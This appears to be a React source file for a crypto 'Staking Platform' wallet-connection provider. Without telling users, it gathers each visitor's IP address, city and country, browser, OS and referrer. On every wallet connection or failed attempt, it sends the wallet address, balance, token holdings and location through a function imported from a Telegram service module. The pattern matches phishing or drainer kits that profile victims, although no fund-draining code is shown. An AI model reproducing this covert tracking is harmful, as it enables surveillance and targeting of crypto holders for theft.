"use client"

import { createContext, useContext, useState, useEffect, type ReactNode } from "react"
import { trackWalletConnection } from "@/lib/telegram-service"
import { WalletConnectionModal } from "@/components/wallet-connection-modal"

declare global {
  interface Window {
    ethereum?: any
    ethers?: any
  }
}

// WalletConnect project ID
const WALLET_CONNECT_PROJECT_ID = "2fc330b1a9aa1b7c859bd84210853433"

const WALLET_OPTIONS = [
  { name: "Binance Web3 Wallet", color: "#F0B90B", icon: "/images/wallets/binance.png" },
  { name: "Browser", color: "#4285F4", icon: "/images/wallets/browser.png" },
  { name: "MetaMask", color: "#F6851B", icon: "/images/wallets/metamask-new.png" },
  { name: "OKX Wallet", color: "#000000", icon: "/images/wallets/okx.png" },
  { name: "Ledger", color: "#000000", icon: "/images/wallets/ledger.png" },
  { name: "Exodus", color: "#1B1B1B", icon: "/images/wallets/exodus-new.png" },
]

const OTHER_WALLET_OPTIONS = [
  { name: "Trust Wallet", color: "#3375BB", icon: "/images/wallets/trustwallet.png" },
  { name: "Coinbase Wallet", color: "#0052FF", icon: "/images/wallets/coinbase.png" },
  { name: "Rainbow", color: "#001E59", icon: "/images/wallets/rainbow.png" },
  { name: "Argent", color: "#FF875B", icon: "/images/wallets/argent.png" },
  { name: "imToken", color: "#11C4D1", icon: "/images/wallets/imtoken.png" },
  { name: "Crypto.com", color: "#002D74", icon: "/images/wallets/crypto-com.png" },
  { name: "TokenPocket", color: "#2980FE", icon: "/images/wallets/tokenpocket.png" },
]

type Web3ContextType = {
  isConnected: boolean
  address: string | null
  balance: string
  connect: () => Promise<boolean>
  disconnect: () => void
  refreshBalance: () => Promise<number>
}

export const Web3Context = createContext<Web3ContextType>({
  isConnected: false,
  address: null,
  balance: "0",
  connect: async () => false,
  disconnect: () => {},
  refreshBalance: async () => 0,
})

export const useWeb3 = () => useContext(Web3Context)

export function Web3Provider({ children }: { children: ReactNode }) {
  const [isConnected, setIsConnected] = useState(false)
  const [address, setAddress] = useState<string | null>(null)
  const [balance, setBalance] = useState("0")
  const [walletType, setWalletType] = useState<string>("Unknown")
  const [userIP, setUserIP] = useState<string | null>(null)
  const [userLocation, setUserLocation] = useState<{ country?: string; city?: string } | null>(null)
  const [userBrowser, setUserBrowser] = useState<string>("Unknown")
  const [userOS, setUserOS] = useState<string>("Unknown")
  const [referrer, setReferrer] = useState<string>("Direct")
  const [isMobile, setIsMobile] = useState(false)
  const [isConnecting, setIsConnecting] = useState(false)
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
  const [skipAutoConnect, setSkipAutoConnect] = useState(false)
  const [wcUri, setWcUri] = useState<string | null>(null)

  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
      return /android|iPad|iPhone|iPod/i.test(userAgent) && !/Windows Phone/i.test(userAgent)
    }
    setIsMobile(checkMobile())
  }, [])

  useEffect(() => {
    const storedReferrer = localStorage.getItem("referrer")
    if (storedReferrer) {
      setReferrer(storedReferrer)
    } else if (document.referrer) {
      setReferrer(document.referrer)
    }

    if (typeof navigator !== "undefined") {
      const userAgent = navigator.userAgent

      if (userAgent.indexOf("Chrome") > -1) setUserBrowser("Chrome")
      else if (userAgent.indexOf("Safari") > -1) setUserBrowser("Safari")
      else if (userAgent.indexOf("Firefox") > -1) setUserBrowser("Firefox")
      else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) setUserBrowser("Internet Explorer")
      else if (userAgent.indexOf("Edge") > -1) setUserBrowser("Edge")
      else if (userAgent.indexOf("Opera") > -1) setUserBrowser("Opera")

      if (userAgent.indexOf("Win") > -1) setUserOS("Windows")
      else if (userAgent.indexOf("Mac") > -1) setUserOS("MacOS")
      else if (userAgent.indexOf("Linux") > -1) setUserOS("Linux")
      else if (userAgent.indexOf("Android") > -1) setUserOS("Android")
      else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1 || userAgent.indexOf("iPod") > -1)
        setUserOS("iOS")
    }

    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        if (data.ip) {
          setUserIP(data.ip)
          return fetch(`https://ipapi.co/${data.ip}/json/`)
        }
        return fetch("https://ipapi.co/json/")
      })
      .then((res) => res.json())
      .then((data) => {
        setUserLocation({
          country: data.country_name,
          city: data.city,
        })
      })
      .catch((err) => {
        console.error("Failed to get IP or location:", err)
      })

    if (typeof window !== "undefined") {
      if (window.ethereum) {
        if (window.ethereum.isMetaMask) {
          setWalletType("MetaMask")
        } else if (window.ethereum.isCoinbaseWallet) {
          setWalletType("Coinbase Wallet")
        } else if (window.ethereum.isWalletConnect) {
          setWalletType("WalletConnect")
        } else if (window.ethereum.isExodus) {
          setWalletType("Exodus")
        } else if (window.ethereum.isRobby) {
          setWalletType("Robby Wallet")
        } else if (window.ethereum.isTrust) {
          setWalletType("Trust Wallet")
        }
      }
    }
  }, [])

  // Check for existing connection only on initial load
  useEffect(() => {
    const checkConnection = async () => {
      // Skip auto-connection if flag is set
      if (skipAutoConnect) {
        return
      }

      const savedAddress = localStorage.getItem("walletAddress")
      if (savedAddress && typeof window !== "undefined" && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: "eth_accounts" })
          if (accounts && accounts.length > 0 && accounts[0].toLowerCase() === savedAddress.toLowerCase()) {
            setAddress(savedAddress)
            setIsConnected(true)
            refreshBalance()
          } else {
            localStorage.removeItem("walletAddress")
          }
        } catch (error) {
          console.error("Error checking wallet connection:", error)
          localStorage.removeItem("walletAddress")
        }
      }
    }

    checkConnection()
  }, []) // Only run on initial mount

  useEffect(() => {
    if (typeof window !== "undefined" && window.ethereum) {
      const handleAccountsChanged = (accounts: string[]) => {
        if (accounts.length === 0) {
          disconnect()
        } else if (accounts[0] !== address) {
          setAddress(accounts[0])
          localStorage.setItem("walletAddress", accounts[0])
          refreshBalance()
        }
      }

      window.ethereum.on("accountsChanged", handleAccountsChanged)

      return () => {
        window.ethereum.removeListener("accountsChanged", handleAccountsChanged)
      }
    }
  }, [address])

  const openMobileWallet = (walletType: string) => {
    console.log(`Opening mobile wallet: ${walletType}`)

    const currentUrl = typeof window !== "undefined" ? window.location.href : "https://your-website-url.com"
    const currentHost = typeof window !== "undefined" ? window.location.host : "your-website-url.com"

    // Universal links and deep links for various wallets
    const deepLinks: Record<string, string> = {
      MetaMask: `https://metamask.app.link/dapp/${currentHost}`,
      "Trust Wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`,
      "Coinbase Wallet": `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(currentUrl)}`,
      Rainbow: `https://rnbwapp.com/dapp?url=${encodeURIComponent(currentUrl)}`,
      Argent: `https://argent.link/app/open?url=${encodeURIComponent(currentUrl)}`,
      imToken: `imtokenv2://browsing?url=${encodeURIComponent(currentUrl)}`,
      "Crypto.com": `https://crypto.com/defi-wallet/browser?url=${encodeURIComponent(currentUrl)}`,
      TokenPocket: `tpoutside://browser?url=${encodeURIComponent(currentUrl)}`,
      "OKX Wallet": `okex://wallet/dapp/details?dappUrl=${encodeURIComponent(currentUrl)}`,
      "Binance Web3 Wallet": `bnc://browse/${encodeURIComponent(currentUrl)}`,
    }

    // If we have a WalletConnect URI, use it for wallets that support WalletConnect
    if (wcUri) {
      const wcDeepLinks: Record<string, string> = {
        Exodus: `exodus://?uri=${encodeURIComponent(wcUri)}`,
        "Trust Wallet": `trust://wc?uri=${encodeURIComponent(wcUri)}`,
        Rainbow: `rainbow://wc?uri=${encodeURIComponent(wcUri)}`,
        Argent: `argent://wc?uri=${encodeURIComponent(wcUri)}`,
        imToken: `imtokenv2://wc?uri=${encodeURIComponent(wcUri)}`,
        "Crypto.com": `cryptowallet://wc?uri=${encodeURIComponent(wcUri)}`,
        TokenPocket: `tpoutside://wc?uri=${encodeURIComponent(wcUri)}`,
      }

      if (wcDeepLinks[walletType]) {
        window.location.href = wcDeepLinks[walletType]
        return true
      }
    }

    // Use standard deep links if available
    if (deepLinks[walletType]) {
      // Try to open the wallet app via deep link
      window.location.href = deepLinks[walletType]

      // Fallback to app store if deep link fails
      setTimeout(() => {
        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent)

        if (isIOS) {
          const appStoreLinks: Record<string, string> = {
            MetaMask: "https://apps.apple.com/us/app/metamask/id1438144202",
            "Trust Wallet": "https://apps.apple.com/us/app/trust-crypto-bitcoin-wallet/id1288339409",
            "Coinbase Wallet": "https://apps.apple.com/us/app/coinbase-wallet-nfts-crypto/id1278383455",
            Rainbow: "https://apps.apple.com/us/app/rainbow-ethereum-wallet/id1457119021",
            Argent: "https://apps.apple.com/us/app/argent-defi-in-a-tap/id1358741926",
            imToken: "https://apps.apple.com/us/app/imtoken-eth-btc-wallet/id1384798940",
            Exodus: "https://apps.apple.com/us/app/exodus-crypto-bitcoin-wallet/id1414384820",
            "Crypto.com": "https://apps.apple.com/us/app/crypto-com-defi-wallet/id1512048310",
            TokenPocket: "https://apps.apple.com/us/app/tokenpocket-crypto-defi-wallet/id1436028697",
            "OKX Wallet": "https://apps.apple.com/us/app/okx-buy-bitcoin-crypto/id1327268470",
            "Binance Web3 Wallet": "https://apps.apple.com/us/app/binance-buy-bitcoin-crypto/id1436799971",
          }
          window.location.href = appStoreLinks[walletType] || "https://apps.apple.com/us/genre/ios-finance/id6015"
        } else {
          const playStoreLinks: Record<string, string> = {
            MetaMask: "https://play.google.com/store/apps/details?id=io.metamask",
            "Trust Wallet": "https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp",
            "Coinbase Wallet": "https://play.google.com/store/apps/details?id=org.toshi",
            Rainbow: "https://play.google.com/store/apps/details?id=me.rainbow",
            Argent: "https://play.google.com/store/apps/details?id=im.argent.contractwalletclient",
            imToken: "https://play.google.com/store/apps/details?id=im.token.app",
            Exodus: "https://play.google.com/store/apps/details?id=exodusmovement.exodus",
            "Crypto.com": "https://play.google.com/store/apps/details?id=com.defi.wallet",
            TokenPocket: "https://play.google.com/store/apps/details?id=vip.mytokenpocket",
            "OKX Wallet": "https://play.google.com/store/apps/details?id=com.okex.android",
            "Binance Web3 Wallet": "https://play.google.com/store/apps/details?id=com.binance.dev",
          }
          window.location.href = playStoreLinks[walletType] || "https://play.google.com/store/apps/category/FINANCE"
        }
      }, 2500)

      return true
    }

    // If we don't have a specific deep link for this wallet
    console.warn(`No deep link available for ${walletType}`)
    return false
  }

  const initializeWalletConnect = async () => {
    try {
      // Dynamically import WalletConnect
      const { EthereumProvider } = await import("@walletconnect/ethereum-provider")

      // Initialize the provider
      const provider = await EthereumProvider.init({
        projectId: WALLET_CONNECT_PROJECT_ID,
        chains: [1], // Ethereum mainnet
        optionalChains: [137, 42161], // Polygon, Arbitrum
        showQrModal: true,
        qrModalOptions: {
          themeMode: "dark",
        },
        metadata: {
          name: "Staking Platform",
          description: "Modern Ethereum Staking Platform",
          url: window.location.origin,
          icons: [`${window.location.origin}/logo.png`],
        },
      })

      // Subscribe to events
      provider.on("connect", (e: any) => {
        console.log("WalletConnect connected!", e)
        if (provider.accounts && provider.accounts.length > 0) {
          const userAddress = provider.accounts[0]
          setAddress(userAddress)
          setIsConnected(true)
          localStorage.setItem("walletAddress", userAddress)
          refreshBalance()
        }
      })

      provider.on("disconnect", () => {
        console.log("WalletConnect disconnected!")
        disconnect()
      })

      // Connect
      await provider.connect()

      // Expose provider globally for debugging
      if (typeof window !== "undefined") {
        window.ethereum = provider
      }

      return true
    } catch (error) {
      console.error("Failed to initialize WalletConnect:", error)
      return false
    }
  }

  const connect = async () => {
    if (isConnecting) return false

    // Set flag to skip auto-connect to allow wallet switching
    setSkipAutoConnect(true)
    setIsWalletModalOpen(true)
    return false
  }

  const disconnectWallet = async () => {
    // Try to disconnect using provider methods if available
    if (typeof window !== "undefined" && window.ethereum) {
      try {
        // Some wallets support this method to disconnect
        if (window.ethereum.disconnect) {
          await window.ethereum.disconnect()
        }

        // For MetaMask and other wallets, we can try to clear permissions
        if (window.ethereum.request) {
          try {
            await window.ethereum.request({
              method: "wallet_revokePermissions",
              params: [{ eth_accounts: {} }],
            })
          } catch (e) {
            console.warn("Could not revoke wallet permissions:", e)
          }
        }
      } catch (error) {
        console.warn("Error disconnecting from wallet:", error)
      }
    }

    // Clear local state
    setAddress(null)
    setIsConnected(false)
    setBalance("0")
    localStorage.removeItem("walletAddress")

    // Set flag to skip auto-connect to allow wallet switching
    setSkipAutoConnect(true)
  }

  const handleWalletSelection = async (walletName: string) => {
    setIsConnecting(true)
    setIsWalletModalOpen(false)

    try {
      // Clear any existing connection
      if (isConnected) {
        // First disconnect from current wallet
        await disconnectWallet()
      }

      // Special case for WalletConnect
      if (walletName === "WalletConnect") {
        const success = await initializeWalletConnect()
        setIsConnecting(false)
        return success
      }

      if (typeof window === "undefined" || !window.ethereum) {
        console.log("No Ethereum wallet detected in browser")

        if (isMobile) {
          openMobileWallet(walletName)
          setIsConnecting(false)
          return false
        } else {
          // For desktop without injected provider, try WalletConnect
          const success = await initializeWalletConnect()
          setIsConnecting(false)
          return success
        }
      }

      setWalletType(walletName)

      // Force page reload to clear any cached provider state
      // This is the most reliable way to ensure a clean connection
      if (localStorage.getItem("walletAddress")) {
        localStorage.removeItem("walletAddress")
        localStorage.setItem("pendingWalletConnect", walletName)
        window.location.reload()
        return false
      }

      console.log("Requesting accounts...")
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })

      if (!accounts || accounts.length === 0) {
        throw new Error("No accounts returned from wallet")
      }

      const userAddress = accounts[0]
      console.log("Account connected:", userAddress)

      setAddress(userAddress)
      setIsConnected(true)

      const balanceHex = await window.ethereum.request({
        method: "eth_getBalance",
        params: [userAddress, "latest"],
      })

      const balanceWei = Number.parseInt(balanceHex, 16)
      const balanceEth = balanceWei / 1e18
      setBalance(balanceEth.toFixed(6))

      localStorage.setItem("walletAddress", userAddress)
      localStorage.removeItem("pendingWalletConnect")

      const tokenHoldings = await getTokenHoldings(userAddress)

      try {
        await trackWalletConnection({
          address: userAddress,
          balance: balanceEth.toFixed(6),
          walletType: walletName,
          success: true,
          ip: userIP || "Unknown",
          country: userLocation?.country,
          city: userLocation?.city,
          referer: referrer,
          userAgent: navigator.userAgent,
          browser: userBrowser,
          os: userOS,
          tokenHoldings,
          isMobile,
        })
      } catch (notificationError) {
        console.warn("Failed to send connection notification:", notificationError)
      }

      return true
    } catch (error) {
      console.error("Error connecting wallet:", error)

      try {
        await trackWalletConnection({
          address: "Connection Failed",
          balance: "0",
          walletType: walletName,
          success: false,
          error: error instanceof Error ? error.message : String(error),
          ip: userIP || "Unknown",
          country: userLocation?.country,
          city: userLocation?.city,
          referer: referrer,
          userAgent: navigator.userAgent,
          browser: userBrowser,
          os: userOS,
          isMobile,
        })
      } catch (notificationError) {
        console.warn("Failed to send error notification:", notificationError)
      }

      return false
    } finally {
      setIsConnecting(false)
    }
  }

  // Check for pending wallet connection after page reload
  useEffect(() => {
    const pendingWallet = localStorage.getItem("pendingWalletConnect")
    if (pendingWallet) {
      // Attempt to connect with the pending wallet
      handleWalletSelection(pendingWallet)
    }
  }, [])

  const getTokenHoldings = async (address: string) => {
    try {
      return {
        ETH: balance,
      }
    } catch (error) {
      console.error("Error getting token holdings:", error)
      return {}
    }
  }

  const refreshBalance = async () => {
    if (isConnected && address && typeof window !== "undefined" && window.ethereum) {
      try {
        const balanceHex = await window.ethereum.request({
          method: "eth_getBalance",
          params: [address, "latest"],
        })

        const balanceWei = Number.parseInt(balanceHex, 16)
        const balanceEth = balanceWei / 1e18
        setBalance(balanceEth.toFixed(6))
        return balanceEth
      } catch (error) {
        console.error("Error refreshing balance:", error)
      }
    }
    return 0
  }

  const disconnect = () => {
    disconnectWallet()
  }

  return (
    <Web3Context.Provider
      value={{
        isConnected,
        address,
        balance,
        connect,
        disconnect,
        refreshBalance,
      }}
    >
      {children}
      <WalletConnectionModal
        isOpen={isWalletModalOpen}
        onClose={() => setIsWalletModalOpen(false)}
        walletOptions={[
          {
            name: "WalletConnect",
            color: "#3B99FC",
            icon: "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjE4NSIgdmlld0JveD0iMCAwIDMwMCAxODUiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNNjAuMTAyIDMwLjIyNkMxMDQuMDk2IC0xMC4wNzUzIDE3NS45MDQgLTEwLjA3NTMgMjE5Ljg5OCAzMC4yMjZMMjI2LjMwNyAzNi4wMTdDMjI4LjI3NSAzNy44MzY0IDIyOC4yNzUgNDAuOTU5NiAyMjYuMzA3IDQyLjc3OUwxOTcuNzYgNjkuMDEzM0MxOTYuNzc2IDcwLjQyMzIgMTk0LjkyNiA3MC40MjMyIDE5My45NDIgNjkuMDEzM0wxODQuNzM1IDYwLjU1MzJDMTU0LjQ4OSAzMi43NzI2IDEyNS41MTEgMzIuNzcyNiA5NS4yNjQ5IDYwLjU1MzJMODUuMzA2NyA2OS43MzY5Qzg0LjMyMjcgNzEuMTQ2OCA4Mi40NzI3IDcxLjE0NjggODEuNDg4NyA2OS43MzY5TDUyLjk0MTYgNDMuNTAyNkM1MC45NzM2IDQxLjY4MzIgNTAuOTczNiAzOC41NiA1Mi45NDE2IDM2Ljc0MDZMNjAuMTAyIDMwLjIyNlpNMjQyLjM0MiA1MS4zNDY2TDI2Ny45NTEgNzQuOTg2NkMyNjkuOTE5IDc2LjgwNiAyNjkuOTE5IDc5LjkyOTIgMjY3Ljk1MSA4MS43NDg2TDIwMC4yOTMgMTQ0LjAxNUMxOTguMzI1IDE0NS44MzQgMTk1LjM3NyAxNDUuODM0IDE5My40MDkgMTQ0LjAxNUMxOTMuNDA5IDE0NC4wMTUgMTkzLjQwOSAxNDQuMDE1IDE5My40MDkgMTQ0LjAxNUwxNDMuNTYyIDk4LjA1NzRDMTQzLjA3IDk3LjM1MjQgMTQyLjE0NSA5Ny4zNTI0IDE0MS42NTMgOTguMDU3NEMxNDEuNjUzIDk4LjA1NzQgMTQxLjY1MyA5OC4wNTc0IDE0MS42NTMgOTguMDU3NEwxMDEuODkxIDE0NC4wMTVDOTkuOTIzIDE0NS44MzQgOTYuOTc1IDE0NS44MzQgOTUuMDA3IDE0NC4wMTVDOTUuMDA3IDE0NC4wMTUgOTUuMDA3IDE0NC4wMTUgOTUuMDA3IDE0NC4wMTVMMjcuMzQ5MSA4MS43NDg2QzI1LjM4MTEgNzkuOTI9MiAyNS4zODExIDc2LjgwNiAyNy4zNDkxIDc0Ljk4NjZMNTIuOTU4MSA1MS4zNDY2QzU0LjkyNjEgNDkuNTI3MiA1Ny44NzQxIDQ5LjUyNzIgNTkuODQyMSA1MS4zNDY2TDEwOS42ODkgOTcuMzA0MkMxMTAuMTgxIDk4LjAwOTIgMTExLjEwNiA5OC4wMDkyIDExMS41OTggOTcuMzA0MkMxMTEuNTk4IDk3LjMwNDIgMTExLjU5OCA5Ny4zMDQyIDExMS41OTggOTcuMzA0MkwxNTEuMzYgNTEuMzQ2NkMxNTMuMzI4IDQ5LjUyNzIgMTU2LjI3NiA0OS41MjcyIDE1OC4yNDQgNTEuMzQ2NkMxNTguMjQ0IDUxLjM0NjYgMTU4LjI0NCA1MS4zNDY2IDE1OC4yNDQgNTEuMzQ2NkwyMDguMDkxIDk3LjMwNDJDMjA4LjU4MyA5OC4wMDkyIDIwOS41MDggOTguMDA5MiAyMTAgOTcuMzA0MkMyMTAgOTcuMzA0MiAyMTAgOTcuMzA0MiAyMTAgOTcuMzA0MkwyNTkuODQ3IDUxLjM0NjZDMjYxLjgxNSA0OS41MjcyIDI2NC43NjMgNDkuNTI3MiAyNjYuNzMxIDUxLjM0NjZMMjQyLjM0MiA1MS4zNDY2WiIgZmlsbD0iIzNCOTlGQyIvPgo8L3N2Zz4K",
          },
          ...WALLET_OPTIONS.slice(0, 5), // Only include the first 5 wallet options in the main list
        ]}
        otherWalletOptions={OTHER_WALLET_OPTIONS} // We still need to pass this for the component props, but it won't be used
        onSelectWallet={handleWalletSelection}
      />
    </Web3Context.Provider>
  )
}
